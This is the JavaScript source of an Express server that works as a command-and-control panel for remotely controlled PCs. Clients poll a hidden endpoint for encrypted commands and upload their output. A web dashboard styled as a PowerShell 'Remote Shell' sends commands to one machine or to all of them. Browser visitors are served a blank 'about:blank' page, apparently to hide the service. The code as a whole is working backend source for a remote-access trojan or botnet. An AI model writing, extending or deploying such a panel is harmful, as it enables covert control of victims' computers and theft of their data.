const express = require('express');
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    next();
});

const ADMIN_PASSWORT = process.env.ADMIN_PASSWORD || "Achtung_Passwort_ndern";
const AES_KEY = crypto.randomBytes(32);
const ALGORITHM = 'aes-256-cbc';
const registeredTokens = {};
const pcCommands = {};
const pcOutputs = {};

function generateToken() { return crypto.randomBytes(24).toString('hex'); }

function encrypt(text) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, AES_KEY, iv);
    return iv.toString('hex') + ':' + (cipher.update(text, 'utf8', 'hex') + cipher.final('hex'));
}

function decrypt(text) {
    const parts = text.split(':');
    const iv = Buffer.from(parts[0], 'hex');
    const decipher = crypto.createDecipheriv(ALGORITHM, AES_KEY, iv);
    return decipher.update(parts[1], 'hex', 'utf8') + decipher.final('utf8');
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: process.env.SESSION_SECRET || 'session-secret',
    resave: false, saveUninitialized: false,
    cookie: { maxAge: 30 * 60 * 1000 }
}));

const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5,
    message: '<h1>Zu viele Fehlversuche!</h1>' });

// ==================== REGISTRIERUNG ====================
app.post('/register', (req, res) => {
    const { pcId } = req.body;
    if (!pcId) return res.status(400).json({ error: 'pcId erforderlich' });
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token: generateToken(), lastSeen: Date.now(), online: false };
    }
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();
    res.json({ token: registeredTokens[pcId].token });
});

// ==================== PC ENTFERNEN ====================
app.post('/remove-pc', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).json({ error: 'Unauthorized' });
    const { pcId } = req.body;
    if (pcId && registeredTokens[pcId]) {
        delete registeredTokens[pcId];
        delete pcCommands[pcId];
        delete pcOutputs[pcId];
        console.log(`[PC ENTFERNT] ${pcId}`);
        res.json({ status: 'PC ' + pcId + ' entfernt' });
    } else {
        res.status(404).json({ error: 'PC nicht gefunden' });
    }
});

// ==================== HEADLESS ====================
app.get('/headless', (req, res) => {
    const ua = req.headers['user-agent'] || '';
    if (/Mozilla|Chrome|Safari|Firefox|Edge|Brave/i.test(ua)) {
        return res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>');
    }
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    if (!token || !pcId) return res.status(401).send('Unauthorized');
    if (!registeredTokens[pcId]) {
        registeredTokens[pcId] = { token, lastSeen: Date.now(), online: true };
    }
    registeredTokens[pcId].token = token;
    registeredTokens[pcId].online = true;
    registeredTokens[pcId].lastSeen = Date.now();
    const command = pcCommands[pcId];
    if (command) {
        try { res.send(decrypt(command)); delete pcCommands[pcId]; }
        catch { res.send('KEIN_BEFEHL'); }
    } else { res.send('KEIN_BEFEHL'); }
});

// ==================== OUTPUT ====================
app.post('/output', (req, res) => {
    const token = req.headers['x-pc-token'];
    const pcId = req.headers['x-pc-id'];
    if (!token || !pcId || !registeredTokens[pcId] || registeredTokens[pcId].token !== token) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        const output = Buffer.from(req.body.output, 'base64').toString('utf8');
        if (!pcOutputs[pcId]) pcOutputs[pcId] = [];
        pcOutputs[pcId].push({ timestamp: new Date().toISOString(), output });
        // Nur letzte 50 Outputs speichern (Speicher sparen)
        if (pcOutputs[pcId].length > 50) pcOutputs[pcId] = pcOutputs[pcId].slice(-50);
        res.json({ status: 'received' });
    } catch { res.status(500).json({ error: 'Base64 Fehler' }); }
});

// ==================== BEFEHL ====================
app.post('/command', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    const { target, command } = req.body;
    if (!command) return res.status(400).send('Befehl erforderlich');
    const encrypted = encrypt(command);
    if (target === 'all') {
        for (const id in registeredTokens) pcCommands[id] = encrypted;
        res.json({ status: 'Gesendet an ALLE PCs' });
    } else if (registeredTokens[target]) {
        pcCommands[target] = encrypted;
        res.json({ status: 'Gesendet an ' + target });
    } else {
        res.status(404).json({ error: 'PC nicht gefunden' });
    }
});

// ==================== STATUS ====================
app.get('/pcs', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    res.json(Object.entries(registeredTokens).map(([id, d]) => ({
        id, online: d.online, lastSeen: new Date(d.lastSeen).toLocaleString('de-DE'),
        outputCount: pcOutputs[id] ? pcOutputs[id].length : 0
    })));
});

app.get('/outputs/:pcId', (req, res) => {
    if (!req.session.eingeloggt) return res.status(403).send('Zugriff verweigert!');
    res.json(pcOutputs[req.params.pcId] || []);
});

// ==================== ADMIN ====================
app.get('/', (req, res) => res.send('<!DOCTYPE html><html><head><title>about:blank</title></head><body></body></html>'));

app.get('/admin', (req, res) => {
    if (req.session.eingeloggt) return res.redirect('/admin/dashboard');
    res.send('<h1>Admin Login</h1><form action="/admin/login" method="POST"><input type="password" name="password" placeholder="Passwort" required><br><br><button type="submit">Einloggen</button></form>');
});

app.post('/admin/login', loginLimiter, (req, res) => {
    if (req.body.password === ADMIN_PASSWORT) { req.session.eingeloggt = true; res.redirect('/admin/dashboard'); }
    else res.send('<h1>Falsches Passwort!</h1><a href="/admin">Nochmal</a>');
});

app.get('/admin/dashboard', (req, res) => {
    if (!req.session.eingeloggt) return res.redirect('/admin');
    res.send(`<!DOCTYPE html>
<html>
<head>
<title>Remote Shell</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Courier New', monospace; background: #0c0c0c; color: #ccc; height: 100vh; display: flex; flex-direction: column; }
#topbar { background: #1a1a1a; padding: 8px 15px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #333; flex-wrap: wrap; }
#topbar select { background: #2d2d2d; color: #fff; border: 1px solid #555; padding: 5px 10px; border-radius: 3px; }
#topbar .status { font-size: 12px; }
.online { color: #00ff88; } .offline { color: #ff4444; }
#terminal { flex: 1; overflow-y: auto; padding: 10px; font-size: 13px; line-height: 1.4; }
#terminal .prompt { color: #00d4ff; }
#terminal .output { color: #ccc; white-space: pre-wrap; word-break: break-all; }
#terminal .error { color: #ff6b6b; white-space: pre-wrap; word-break: break-all; }
#terminal .info { color: #888; }
#inputLine { display: flex; padding: 8px 15px; background: #1a1a1a; border-top: 1px solid #333; }
#inputLine span { color: #00d4ff; margin-right: 8px; white-space: nowrap; }
#cmdInput { flex: 1; background: transparent; border: none; color: #fff; font-family: 'Courier New', monospace; font-size: 13px; outline: none; }
.pc-list { display: flex; gap: 8px; flex-wrap: wrap; margin-left: auto; }
.pc-badge { font-size: 11px; padding: 3px 8px; border-radius: 3px; display: flex; align-items: center; gap: 5px; }
.pc-badge.on { background: #003d25; color: #00ff88; }
.pc-badge.off { background: #3d0000; color: #ff4444; }
.pc-badge button { background: #ff4444; color: white; border: none; border-radius: 2px; cursor: pointer; font-size: 10px; padding: 1px 4px; }
a { color: #00d4ff; text-decoration: none; }
</style>
</head>
<body>
<div id="topbar">
    <strong style="color:#00d4ff;">REMOTE SHELL</strong>
    <select id="target"><option value="all">ALLE PCs</option></select>
    <span class="status" id="status"></span>
    <div class="pc-list" id="pcBadges"></div>
    <a href="/admin/logout" style="margin-left:auto;">Logout</a>
</div>
<div id="terminal"></div>
<div id="inputLine">
    <span id="promptText">PS &gt;</span>
    <input type="text" id="cmdInput" autofocus autocomplete="off" spellcheck="false">
</div>
<script>
const term = document.getElementById('terminal');
const input = document.getElementById('cmdInput');
const target = document.getElementById('target');
const promptText = document.getElementById('promptText');
const status = document.getElementById('status');
const pcBadges = document.getElementById('pcBadges');
let history = [], hIdx = -1;

function add(type, text) {
    const d = document.createElement('div');
    d.className = type; d.textContent = text;
    term.appendChild(d);
    term.scrollTop = term.scrollHeight;
}

async function loadPCs() {
    const pcs = await (await fetch('/pcs')).json();
    const cur = target.value;
    target.innerHTML = '<option value="all">ALLE PCs</option>';
    pcBadges.innerHTML = '';
    pcs.forEach(p => {
        const o = document.createElement('option');
        o.value = p.id; o.textContent = p.id;
        target.appendChild(o);
        const badge = document.createElement('div');
        badge.className = 'pc-badge ' + (p.online ? 'on' : 'off');
        badge.innerHTML = p.id + ' ' + (p.online ? 'ON' : 'OFF') +
            '<button onclick="removePC(\\'' + p.id + '\\')" title="Entfernen">X</button>';
        pcBadges.appendChild(badge);
    });
    try {
        const opt = pcs.find(p => p.id === cur);
        target.value = opt ? opt.id : 'all';
    } catch(e) {}
    const n = pcs.filter(p => p.online).length;
    status.textContent = n + ' online';
    status.className = n > 0 ? 'status online' : 'status offline';
    promptText.textContent = target.value === 'all' ? 'PS (ALL) >' : 'PS ' + target.value + ' >';
}

async function removePC(id) {
    if (!confirm('PC ' + id + ' wirklich entfernen?')) return;
    await fetch('/remove-pc', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pcId: id }) });
    loadPCs();
    add('info', '[SYSTEM] PC ' + id + ' entfernt');
}

input.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') {
        const cmd = input.value.trim();
        if (!cmd) return;
        history.push(cmd); hIdx = history.length;
        const t = target.value;
        add('prompt', promptText.textContent + ' ' + cmd);
        input.value = '';
        add('info', '[SENDEN -> ' + (t === 'all' ? 'ALLE' : t) + ']');
        try {
            await fetch('/command', { method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target: t, command: cmd }) });
            // Output nach 3s laden
            if (t !== 'all') setTimeout(() => loadOutput(t), 3000);
        } catch{}
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (hIdx > 0) { hIdx--; input.value = history[hIdx]; }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (hIdx < history.length - 1) { hIdx++; input.value = history[hIdx]; }
        else { hIdx = history.length; input.value = ''; }
    } else if (e.key === 'Tab') {
        e.preventDefault();
        const opts = Array.from(target.options);
        const idx = target.selectedIndex;
        target.selectedIndex = (idx + 1) % opts.length;
        promptText.textContent = target.value === 'all' ? 'PS (ALL) >' : 'PS ' + target.value + ' >';
    }
});

async function loadOutput(pcId) {
    const outputs = await (await fetch('/outputs/' + pcId)).json();
    const last = outputs[outputs.length - 1];
    if (last) {
        add('output', '[' + pcId + ' OUTPUT]:');
        add(last.output.trim().startsWith('Exit Code') ? 'error' : 'output', last.output.trim());
    } else {
        add('info', '[' + pcId + ']: Kein Output vorhanden');
    }
}

loadPCs();
setInterval(loadPCs, 10000);
document.addEventListener('click', () => input.focus());
</script>
</body>
</html>`);
});

app.get('/admin/logout', (req, res) => { req.session.destroy(); res.redirect('/admin'); });

app.listen(PORT, () => {
    console.log('Server lauft auf Port ' + PORT);
    console.log('Admin: /admin');
});
